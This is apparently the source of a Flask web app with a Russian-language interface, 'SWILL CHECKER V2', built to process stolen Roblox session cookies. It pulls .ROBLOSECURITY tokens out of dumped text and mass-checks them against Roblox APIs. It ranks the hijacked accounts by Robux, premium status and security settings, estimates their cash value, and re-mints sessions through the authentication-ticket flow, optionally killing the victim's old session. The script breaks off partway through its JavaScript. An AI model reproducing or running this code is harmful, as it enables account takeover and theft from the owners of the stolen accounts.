import os
import asyncio
import aiohttp
import aiosqlite
import json
import re
import time
import logging
import zipfile
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO
from cryptography.fernet import Fernet

os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("logs", exist_ok=True)
os.makedirs("history", exist_ok=True)

ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

DB_PATH = "history/swill.db"

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS checker_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                type TEXT,
                total INTEGER,
                valid INTEGER,
                cookies TEXT,
                full_data TEXT,
                download_url TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS fresher_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                mode TEXT,
                refreshed_count INTEGER,
                success_count INTEGER,
                fail_count INTEGER,
                cookies TEXT,
                old_cookies TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT UNIQUE,
                username TEXT,
                cookie_encrypted TEXT,
                last_check TEXT,
                robux INTEGER,
                is_premium INTEGER,
                created TEXT,
                score INTEGER,
                checked_count INTEGER
            )
        """)
        await db.commit()

def encrypt_cookie(cookie: str) -> str:
    return cipher.encrypt(cookie.encode()).decode()

def decrypt_cookie(encrypted: str) -> str:
    return cipher.decrypt(encrypted.encode()).decode()

def extract_cookies_from_text(text: str):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='):
            cookie = cookie[15:]
        if len(cookie) > 50:
            cookies.append(cookie)
    
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies:
            cookies.append(cookie)
    
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen:
            seen.add(c)
            unique.append(c)
    return unique

def format_quick_report(result):
    if result['status'] != '✅':
        return "❌ НЕВАЛИД"
    
    score = result.get('score', 0)
    if score >= 200: rank = "👑"
    elif score >= 150: rank = "💎" 
    elif score >= 100: rank = "⭐"
    elif score >= 60: rank = "🟢"
    elif score >= 30: rank = "🔹"
    else: rank = "⚪"
    
    badges = []
    if result.get('is_premium'): badges.append("💠")
    if result.get('has_2fa'): badges.append("🔐")
    if result.get('has_pin'): badges.append("📌")
    if result.get('has_email'): badges.append("📧")
    if result.get('is_banned'): badges.append("🚫")
    
    return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"

def merge_cookie_files(contents):
    all_cookies = set()
    for c in contents:
        for l in c.split('\n'):
            l = l.strip()
            if len(l) > 20:
                all_cookies.add(l)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    if not cookies or count <= 0:
        return []
    files = []
    for i in range(0, len(cookies), count):
        files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    if not cookies or num <= 0:
        return []
    if num > len(cookies):
        num = len(cookies)
    per = len(cookies) // num
    rem = len(cookies) % num
    files = []
    idx = 0
    for i in range(num):
        end = idx + per + (1 if i < rem else 0)
        files.append('\n'.join(cookies[idx:end]))
        idx = end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for l in content.split('\n'):
        l = l.strip()
        if not l:
            continue
        if '.ROBLOSECURITY=' in l:
            val = l.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(l) > 50 and not l.startswith('#'):
            cookies.append(l)
    return '\n'.join(cookies)

def run_async(coro):
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

class AsyncRobloxChecker:
    def __init__(self, max_workers: int = 20):
        self.max_workers = max_workers
        self.session = None
        
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def quick_validate(self, cookie: str):
        result = {
            'status': '❌',
            'username': '?',
            'user_id': '?',
            'robux': 0,
            'created': '?',
            'created_ts': 0,
            'is_premium': False,
            'has_email': False,
            'has_2fa': False,
            'has_pin': False,
            'has_phone': False,
            'cookie': cookie,
            'score': 0,
            'is_banned': False,
            'security_status': '⚠️ НИЗКИЙ',
            'friends_count': 0,
            'followers_count': 0
        }
        
        try:
            c = cookie.strip()
            if ".ROBLOSECURITY=" in c:
                c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
            
            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
            cookies = {'.ROBLOSECURITY': c}
            
            async with self.session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies=cookies) as resp:
                if resp.status != 200:
                    return result
                data = await resp.json()
                if 'id' not in data:
                    return result
                
                result['status'] = '✅'
                result['username'] = data.get('name', '?')
                result['user_id'] = data.get('id', '?')
                uid = result['user_id']
            
            tasks = []
            tasks.append(self._fetch_json(f'https://economy.roblox.com/v1/users/{uid}/currency', headers, cookies))
            tasks.append(self._fetch_json(f'https://users.roblox.com/v1/users/{uid}', headers, cookies))
            tasks.append(self._fetch_json(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', headers, cookies))
            tasks.append(self._fetch_json('https://www.roblox.com/my/settings/json', headers, cookies))
            tasks.append(self._fetch_json(f'https://friends.roblox.com/v1/users/{uid}/friends/count', headers, cookies))
            tasks.append(self._fetch_json(f'https://friends.roblox.com/v1/users/{uid}/followers/count', headers, cookies))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            if isinstance(results[0], dict):
                result['robux'] = results[0].get('robux', 0)
            if isinstance(results[1], dict):
                created = results[1].get('created', '')
                if created:
                    try:
                        dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
                        result['created'] = dt.strftime('%d.%m.%Y')
                        result['created_ts'] = dt.timestamp()
                    except:
                        pass
            if isinstance(results[2], dict):
                result['is_premium'] = results[2].get('isSubscribed', False)
            if isinstance(results[3], dict):
                sec = results[3].get('MyAccountSecurityModel', {})
                result['has_email'] = sec.get('IsEmailSet', False)
                result['has_2fa'] = sec.get('IsTwoStepEnabled', False)
                result['has_pin'] = sec.get('IsAccountPinEnabled', False)
                result['has_phone'] = sec.get('IsPhoneSet', False)
            if isinstance(results[4], dict):
                result['friends_count'] = results[4].get('count', 0)
            if isinstance(results[5], dict):
                result['followers_count'] = results[5].get('count', 0)
            
            score = 0
            if result['robux'] >= 10000: score += 100
            elif result['robux'] >= 1000: score += 50
            elif result['robux'] >= 100: score += 25
            elif result['robux'] > 0: score += 10
            
            if result['is_premium']: score += 50
            if result['has_email']: score += 15
            if result['has_2fa']: score += 10
            if result['has_pin']: score += 5
            if result['has_phone']: score += 5
            
            if result['created_ts'] > 0:
                age = (datetime.now().timestamp() - result['created_ts']) / 86400
                if age > 365*3: score += 30
                elif age > 365: score += 20
                elif age > 180: score += 10
            
            if result['friends_count'] > 100: score += 10
            if result['followers_count'] > 100: score += 10
            
            result['score'] = min(score, 300)
            
            sec_count = sum([result['has_email'], result['has_2fa'], result['has_pin'], result['has_phone']])
            if sec_count >= 3:
                result['security_status'] = '🔒 ВЫСОКИЙ'
            elif sec_count >= 2:
                result['security_status'] = '🔐 СРЕДНИЙ'
            else:
                result['security_status'] = '⚠️ НИЗКИЙ'
                
        except Exception as e:
            logger.error(f"Error validating cookie: {e}")
            result['status'] = '❌'
        
        return result
    
    async def _fetch_json(self, url: str, headers: dict, cookies: dict):
        try:
            async with self.session.get(url, headers=headers, cookies=cookies) as resp:
                if resp.status == 200:
                    return await resp.json()
                return {}
        except:
            return {}
    
    async def mass_check(self, cookies: list):
        semaphore = asyncio.Semaphore(self.max_workers)
        
        async def check_with_semaphore(cookie):
            async with semaphore:
                return await self.quick_validate(cookie)
        
        tasks = [check_with_semaphore(c) for c in cookies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                final_results.append({
                    'status': '❌',
                    'cookie': cookies[i],
                    'error': str(result)[:100],
                    'score': -1
                })
            else:
                final_results.append(result)
        
        return final_results

class AsyncRobloxFresher:
    def __init__(self, max_workers: int = 5):
        self.max_workers = max_workers
        
    async def refresh_cookie(self, cookie: str, kill_old: bool = False):
        result = {
            'success': False,
            'new_cookie': None,
            'username': '?',
            'user_id': '?',
            'error': None
        }
        
        try:
            c = cookie.strip()
            if ".ROBLOSECURITY=" in c:
                c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
            
            cookies_dict = {'.ROBLOSECURITY': c}
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            async with aiohttp.ClientSession() as session:
                async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies=cookies_dict) as resp:
                    if resp.status != 200:
                        result['error'] = "Кука невалидна"
                        return result
                    user_data = await resp.json()
                    result['username'] = user_data.get('name', '?')
                    result['user_id'] = user_data.get('id', '?')
                
                async with session.post('https://auth.roblox.com/v2/logout', headers=headers, cookies=cookies_dict) as resp:
                    csrf_token = resp.headers.get('x-csrf-token')
                    if not csrf_token:
                        result['error'] = "CSRF token not found"
                        return result
                
                ticket_headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'RBXauthenticationNegotiation': '1',
                    'referer': 'https://www.roblox.com/hewhewhew',
                    'X-CSRF-Token': csrf_token,
                    'Content-Type': 'application/json'
                }
                async with session.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}) as resp:
                    auth_ticket = resp.headers.get('rbx-authentication-ticket')
                    if not auth_ticket:
                        result['error'] = "Auth ticket not found"
                        return result
                
                redeem_headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'RBXauthenticationNegotiation': '1',
                    'Content-Type': 'application/json'
                }
                async with session.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}) as resp:
                    new_cookie_value = None
                    set_cookie = resp.headers.get('Set-Cookie', '')
                    if '.ROBLOSECURITY=' in set_cookie:
                        match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
                        if match:
                            new_cookie_value = match.group(1)
                    
                    if not new_cookie_value:
                        for co in resp.cookies:
                            if co.key == '.ROBLOSECURITY' and co.value:
                                new_cookie_value = co.value
                                break
                
                if not new_cookie_value:
                    result['error'] = "New cookie not found"
                    return result
                
                if kill_old:
                    try:
                        break_headers = {
                            'User-Agent': 'Mozilla/5.0',
                            'X-CSRF-Token': csrf_token,
                            'Content-Type': 'application/json'
                        }
                        await session.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict)
                    except:
                        pass
                
                async with session.get('https://users.roblox.com/v1/users/authenticated', headers=headers, cookies={'.ROBLOSECURITY': new_cookie_value}) as resp:
                    if resp.status == 200 and 'id' in await resp.json():
                        result['new_cookie'] = new_cookie_value
                        result['success'] = True
                    else:
                        result['error'] = "New cookie validation failed"
                        
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    async def mass_refresh(self, cookies: list, kill_old: bool = False):
        semaphore = asyncio.Semaphore(self.max_workers)
        
        async def refresh_with_semaphore(cookie):
            async with semaphore:
                return await self.refresh_cookie(cookie, kill_old)
        
        tasks = [refresh_with_semaphore(c) for c in cookies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                final_results.append({
                    'success': False,
                    'error': str(result)[:100],
                    'cookie': cookies[i]
                })
            else:
                final_results.append(result)
        
        return final_results

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SWILL CHECKER V2</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
<style>
:root{--bg:#0a0a1a;--bg2:#12122a;--card:#1a1a3a;--card2:#22224a;--input:#0d0d22;--border:#2a2a5a;--text:#fff;--text2:#8888bb;--accent:#7c3aed;--green:#10b981;--red:#ef4444}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;min-height:100vh;background:var(--bg)}
.wrapper{max-width:1600px;margin:0 auto;padding:20px}
.header{display:flex;justify-content:space-between;align-items:center;padding:16px 24px;background:var(--bg2);border-radius:16px;border:1px solid var(--border);margin-bottom:24px}
.logo{font-size:28px;font-weight:900;background:linear-gradient(135deg,#a855f7,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px 16px}
.stat-card .label{font-size:10px;color:var(--text2);text-transform:uppercase}
.stat-card .value{font-size:20px;font-weight:700;color:var(--text)}
.tabs{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
.tab{padding:10px 24px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-weight:600;transition:all 0.3s}
.tab:hover{border-color:var(--accent);color:var(--text)}
.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.tab-content{display:none}
.tab-content.active{display:block}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
@media(max-width:900px){.grid-2{grid-template-columns:1fr}}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px 24px;margin-bottom:20px}
.card h2{font-size:18px;margin-bottom:14px;color:var(--text)}
.textarea{width:100%;padding:12px;background:var(--input);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:monospace;font-size:13px;resize:vertical;min-height:100px}
.upload-area{width:100%;padding:30px;background:var(--input);border:2px dashed var(--border);border-radius:12px;text-align:center;cursor:pointer;transition:all 0.3s}
.upload-area:hover{border-color:var(--accent);background:rgba(124,58,237,0.05)}
.btn{padding:10px 24px;border:none;border-radius:30px;font-weight:700;color:#fff;cursor:pointer;transition:all 0.3s;font-size:13px}
.btn-primary{background:linear-gradient(135deg,#7c3aed,#a855f7)}
.btn-success{background:linear-gradient(135deg,#059669,#10b981)}
.btn-danger{background:linear-gradient(135deg,#dc2626,#ef4444)}
.btn-secondary{background:var(--card2);color:var(--text2);border:1px solid var(--border)}
.btn-sm{padding:6px 14px;font-size:11px}
.result-box{background:var(--input);border:1px solid var(--border);border-radius:10px;padding:14px;margin-top:12px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text);white-space:pre-wrap;word-break:break-all}
.progress-bar{height:4px;background:var(--input);border-radius:20px;margin-top:12px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#7c3aed,#ec4899);transition:width 0.5s}
.history-item{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:8px;cursor:pointer}
.history-item:hover{border-color:var(--accent)}
.history-item .hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
.history-item .detail{display:none;padding-top:8px;border-top:1px solid var(--border);margin-top:8px;font-size:11px;max-height:200px;overflow-y:auto}
.history-item.open .detail{display:block}
.flex-row{display:flex;gap:12px;flex-wrap:wrap}
.flex-1{flex:1;min-width:200px}
.gap-8{display:flex;gap:8px;flex-wrap:wrap}
.mt-8{margin-top:8px}
.mt-12{margin-top:12px}
.text-muted{color:var(--text2);font-size:12px}
.filter-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
.filter-chip{padding:4px 12px;border-radius:14px;font-size:11px;cursor:pointer;background:var(--input);border:1px solid var(--border);color:var(--text2);transition:all 0.2s}
.filter-chip.active{background:rgba(124,58,237,0.3);border-color:var(--accent);color:var(--accent)}
.footer{text-align:center;padding:20px 0;color:var(--text2);font-size:12px;border-top:1px solid var(--border);margin-top:24px}
</style>
</head>
<body>
<div class="wrapper">
<div class="header">
<div class="logo">⚡ SWILL CHECKER V2</div>
<div style="display:flex;gap:12px;align-items:center">
<span id="sessionTimer" style="color:#10b981;font-family:monospace;font-size:14px;">⏱️ 00:00:00</span>
<button class="btn btn-secondary btn-sm" onclick="document.documentElement.setAttribute('data-theme',document.documentElement.getAttribute('data-theme')==='dark'?'light':'dark')">🌓</button>
</div>
</div>

<div class="stats-row">
<div class="stat-card"><div class="label">Всего</div><div class="value" id="totalChecked">0</div></div>
<div class="stat-card"><div class="label">Валидных</div><div class="value" id="validCount">0</div></div>
<div class="stat-card"><div class="label">Premium</div><div class="value" id="premiumCount">0</div></div>
<div class="stat-card"><div class="label">Robux</div><div class="value" id="totalRobux">0</div></div>
<div class="stat-card"><div class="label">Скорость</div><div class="value" id="checkSpeed">0/с</div></div>
</div>

<div class="tabs">
<div class="tab active" onclick="switchTab('checker')">🔍 Чекер</div>
<div class="tab" onclick="switchTab('fresher')">🔄 Фрешер</div>
<div class="tab" onclick="switchTab('history')">📜 История</div>
<div class="tab" onclick="switchTab('tools')">🧰 Инструменты</div>
</div>

<div class="tab-content active" id="tab-checker">
<div class="grid-2">
<div class="card">
<h2>🔍 Одиночная</h2>
<textarea class="textarea" id="singleCookie" placeholder="Вставьте один кук..." rows="3"></textarea>
<button class="btn btn-primary mt-8" id="btnSingleCheck" style="width:100%">🔍 Проверить</button>
<div class="result-box" id="singleResult">Ожидание...</div>
</div>
<div class="card">
<h2>📦 Массовая</h2>
<div class="upload-area" id="massDropArea">
<p>📁 Перетащите или выберите TXT</p>
<p class="text-muted">Асинхронно, 20 потоков</p>
</div>
<input type="file" id="massFile" accept=".txt" style="display:none">
<div id="massFileInfo" class="text-muted" style="margin-top:6px"></div>
<div id="extractInfo" class="text-muted" style="display:none;color:#10b981"></div>
<button class="btn btn-success mt-8" id="btnMassCheck" style="width:100%">🚀 Запустить</button>
<div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
<div id="massLog" style="max-height:60px;overflow-y:auto;margin-top:6px;font-size:11px;color:var(--text2)"></div>
<div class="filter-bar mt-8" id="filterBar" style="display:none">
<span class="filter-chip active" onclick="applyFilter('all',this)">Все</span>
<span class="filter-chip" onclick="applyFilter('premium',this)">💠 Premium</span>
<span class="filter-chip" onclick="applyFilter('rich',this)">💰 >1000R$</span>
<span class="filter-chip" onclick="applyFilter('secure',this)">🔐 2FA</span>
<span class="filter-chip" onclick="applyFilter('old',this)">👴 >3 лет</span>
<span class="filter-chip" onclick="applyFilter('highscore',this)">👑 Score>150</span>
</div>
<div class="result-box" id="massResult">Результаты здесь...</div>
<div id="massActions" style="display:none" class="gap-8 mt-8">
<button class="btn btn-primary btn-sm" onclick="copyValidCookies()">📋 Копировать валидные</button>
<button class="btn btn-secondary btn-sm" onclick="downloadValidOnly()">📥 Валидные</button>
<button class="btn btn-secondary btn-sm" onclick="downloadInvalidOnly()">📥 Невалидные</button>
<button class="btn btn-secondary btn-sm" onclick="downloadFullReport()">📊 Отчёт</button>
</div>
<div id="robuxCalc" style="display:none;margin-top:10px;padding:12px;background:var(--input);border-radius:10px;font-size:13px"></div>
</div>
</div>
</div>

<div class="tab-content" id="tab-fresher">
<div class="card">
<h2>🔄 Обновление сессий</h2>
<div style="display:flex;gap:8px;margin-bottom:14px">
<button class="btn btn-primary btn-sm" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
<button class="btn btn-danger btn-sm" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить старую</button>
</div>
<input type="hidden" id="fresherMode" value="duplicate">
<div class="flex-row">
<div class="flex-1"><textarea class="textarea" id="fresherCookies" placeholder="Вставьте куки..." rows="6"></textarea></div>
<div class="flex-1"><div class="upload-area" id="fresherDropArea"><p>📁 Или загрузите .txt</p></div><input type="file" id="fresherFile" accept=".txt" style="display:none"></div>
</div>
<button class="btn btn-success mt-8" id="btnFresher" style="width:100%">⚡ Обновить</button>
<div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
<div id="fresherStats" class="text-muted mt-8"></div>
<div class="result-box" id="fresherResult">Новые куки здесь...</div>
<div class="mt-8 gap-8">
<button class="btn btn-secondary btn-sm" onclick="copyFresherCookies()">📋 Копировать</button>
<button class="btn btn-secondary btn-sm" onclick="downloadFresherCookies()">📥 Скачать</button>
</div>
</div>
</div>

<div class="tab-content" id="tab-history">
<div class="card"><h2>📜 История проверок</h2><div id="checkerHistoryList"><div class="text-muted">Загрузка...</div></div></div>
<div class="card"><h2>🔄 История обновлений</h2><div id="fresherHistoryList"><div class="text-muted">Загрузка...</div></div></div>
</div>

<div class="tab-content" id="tab-tools">
<div class="grid-2">
<div class="card"><h3>🔗 Слияние</h3><div class="upload-area" id="mergeDropArea"><p>📁 Выберите файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none"><button class="btn btn-primary mt-8" id="btnMerge">🔄 Объединить</button><div class="result-box" id="mergeResult">Ожидание...</div></div>
<div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea"><p>📁 Выберите файл</p></div><input type="file" id="splitFile" accept=".txt" style="display:none"><div class="flex-row mt-8"><input type="number" id="splitCount" value="100" style="flex:1;padding:8px;background:var(--input);border:1px solid var(--border);border-radius:8px;color:var(--text)"><button class="btn btn-primary btn-sm" id="btnSplitCount">По N</button><button class="btn btn-primary btn-sm" id="btnSplitFiles">На N файлов</button></div><div class="result-box" id="splitResult">Ожидание...</div></div>
<div class="card"><h3>🧹 Очистка</h3><textarea class="textarea" id="cleanInput" placeholder="Вставьте куки..." rows="3"></textarea><div class="gap-8 mt-8"><button class="btn btn-primary btn-sm" id="btnCleanDedup">🔄 Дубликаты</button><button class="btn btn-secondary btn-sm" id="btnCleanFormat">📝 Формат</button></div><div class="result-box" id="cleanResult">Ожидание...</div></div>
<div class="card"><h3>📊 Статистика</h3><button class="btn btn-primary" id="btnStats" style="width:100%">📊 Обновить</button><div class="result-box" id="statsResult">Ожидание...</div></div>
</div>
</div>

<div class="footer">SWILL CHECKER V2 · Асинхронный движок · SQLite</div>
</div>

<script>
let massResults=[]; let startTime=Date.now(); let currentFilter='all';

setInterval(()=>{let s=Math.floor((Date.now()-startTime)/1000);document.getElementById('sessionTimer').textContent='⏱️ '+String(Math.floor(s/3600)).padStart(2,'0')+':'+String(Math.floor((s%3600)/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0')},1000);

function switchTab(tab){
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById('tab-'+tab).classList.add('active');
    if(tab==='history')loadHistory();
    if(tab==='checker')loadStats();
}

function setFresherMode(mode){
    document.getElementById('fresherMode').value=mode;
    document.getElementById('modeDuplicate').className='btn btn-sm '+(mode==='duplicate'?'btn-primary':'btn-secondary');
    document.getElementById('modeKill').className='btn btn-sm '+(mode==='kill'?'btn-danger':'btn-secondary');
}

// ==== Drag & Drop ====
function setupDrop(areaId, inputId, callback){
    const area=document.getElementById(areaId);
    if(!area)return;
    area.addEventListener('dragover',e=>{e.preventDefault();area.style.borderColor='#7c3aed'});
    area.addEventListener('dragleave',e=>{e.preventDefault();area.style.borderColor=''});
    area.addEventListener('drop',e=>{
        e.preventDefault();area.style.borderColor='';
        if(e.dataTransfer.files.length){
            const input=document.getElementById(inputId);
            input.files=e.dataTransfer.files;
            input.dispatchEvent(new Event('change'));
            if(callback)callback();
        }
    });
    area.addEventListener('click',()=>document.getElementById(inputId).click());
}

setupDrop('massDropArea','massFile');
setupDrop('fresherDropArea','fresherFile');
setupDrop('mergeDropArea','mergeFiles');
setupDrop('splitDropArea','splitFile');

document.getElementById('massFile').addEventListener('change',function(){
    if(this.files&&this.files[0]){
        let file=this.files[0];
        document.getElementById('massFileInfo').textContent='✅ '+file.name+' ('+(file.size/1024).toFixed(1)+' KB)';
        let reader=new FileReader();
        reader.onload=function(evt){
            window.massFileContent=evt.target.result;
            fetch('/api/extract-preview',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:window.massFileContent})})
            .then(r=>r.json())
            .then(d=>{if(d.success){document.getElementById('extractInfo').style.display='block';document.getElementById('extractInfo').textContent='🔍 Найдено куков: '+d.count}});
        };
        reader.readAsText(file);
    }
});

document.getElementById('fresherFile').addEventListener('change',function(){
    if(this.files&&this.files[0]){
        let reader=new FileReader();
        reader.onload=function(evt){document.getElementById('fresherCookies').value=evt.target.result};
        reader.readAsText(this.files[0]);
    }
});

// ==== Кнопки через addEventListener ====
document.addEventListener('DOMContentLoaded',function(){
    document.getElementById('btnSingleCheck').addEventListener('click',runSingleCheck);
    document.getElementById('btnMassCheck').addEventListener('click',runMassCheck);
    document.getElementById('btnFresher').addEventListener('click',runFresher);
    document.getElementById('btnMerge').addEventListener('click',mergeCookies);
    document.getElementById('btnSplitCount').addEventListener('click',splitByCount);
    document.getElementById('btnSplitFiles').addEventListener('click',splitByFiles);
    document.getElementById('btnCleanDedup').addEventListener('click',function(){cleanCookies('deduplicate')});
    document.getElementById('btnCleanFormat').addEventListener('click',function(){cleanCookies('format')});
    document.getElementById('btnStats').addEventListener('click',loadStats);
    loadStats();loadHistory();
});

// ==== Функции ====
async function runSingleCheck(){
    let c=document.getElementById('singleCookie').value.trim();
    if(!c){document.getElementById('singleResult').textContent='❌ Вставьте кук!';return}
    document.getElementById('singleResult').textContent='⏳ Проверка...';
    try{
        let r=await fetch('/api/single-check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:c})});
        let d=await r.json();
        document.getElementById('singleResult').textContent=d.success?d.report:'❌ '+d.message;
        loadStats();
    }catch(e){document.getElementById('singleResult').textContent='❌ '+e.message}
}

async function runMassCheck(){
    if(!window.massFileContent){document.getElementById('massResult').textContent='❌ Загрузите TXT файл!';return}
    let logBox=document.getElementById('massLog');let resBox=document.getElementById('massResult');let progress=document.getElementById('massProgress');
    resBox.textContent='⏳ Асинхронная проверка...';progress.style.width='10%';logBox.innerHTML='🔄 Запуск (20 потоков)...';
    try{
        let startCheck=Date.now();
        let r=await fetch('/api/mass-check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:window.massFileContent})});
        let d=await r.json();
        progress.style.width='100%';setTimeout(()=>progress.style.width='0%',500);
        let elapsed=((Date.now()-startCheck)/1000).toFixed(1);
        let speed=d.total>0?(d.total/elapsed).toFixed(1):0;
        logBox.innerHTML='✅ За '+elapsed+'с ('+speed+' куков/сек)';
        document.getElementById('checkSpeed').textContent=speed+'/с';
        if(d.success){
            massResults=d.full_data||[];
            document.getElementById('filterBar').style.display='flex';
            document.getElementById('massActions').style.display='flex';
            let totalRobux=d.total_robux||0;
            document.getElementById('robuxCalc').style.display='block';
            document.getElementById('robuxCalc').innerHTML='💰 Всего Robux: ⏣ <b>'+totalRobux.toLocaleString()+'</b> | 💵 ~$'+(totalRobux*0.0035).toFixed(2);
            applyFilter('all',document.querySelector('#filterBar .filter-chip'));
            loadStats();
        }else{resBox.textContent='❌ '+(d.message||'Ошибка')}
    }catch(e){resBox.textContent='❌ '+e.message;progress.style.width='0%'}
}

function applyFilter(type,el){
    currentFilter=type;
    document.querySelectorAll('#filterBar .filter-chip').forEach(c=>c.classList.remove('active'));
    if(el)el.classList.add('active');
    let filtered=massResults;
    switch(type){
        case'premium':filtered=filtered.filter(r=>r.is_premium);break;
        case'rich':filtered=filtered.filter(r=>r.robux>1000);break;
        case'secure':filtered=filtered.filter(r=>r.has_2fa);break;
        case'old':filtered=filtered.filter(r=>r.score>=100);break;
        case'highscore':filtered=filtered.filter(r=>r.score>=150);break;
    }
    let html='🔍 Найдено: '+filtered.length+'\n\n';
    filtered.forEach(r=>{
        let score=r.score||0;
        let rank=score>=200?"👑":score>=150?"💎":score>=100?"⭐":score>=60?"🟢":"🔹";
        let badges=[];if(r.is_premium)badges.push("💠");if(r.has_2fa)badges.push("🔐");if(r.has_pin)badges.push("📌");
        html+=rank+' '+r.username+' ['+r.user_id+'] | ⏣'+(r.robux||0).toLocaleString()+' | '+(r.created||'?')+' | S:'+score+' '+badges.join('')+'\n';
        if(r.status==='✅')html+='  🍪 '+r.cookie+'\n';
    });
    document.getElementById('massResult').textContent=html||'Нет результатов';
}

function copyValidCookies(){
    let valid=massResults.filter(r=>r.status==='✅');
    let text=valid.map(r=>r.cookie).join('\n');
    navigator.clipboard.writeText(text).then(()=>alert('✅ Скопировано '+valid.length+' куки'));
}
function downloadValidOnly(){let valid=massResults.filter(r=>r.status==='✅');downloadFile(valid.map(r=>r.cookie).join('\n'),'valid_cookies.txt')}
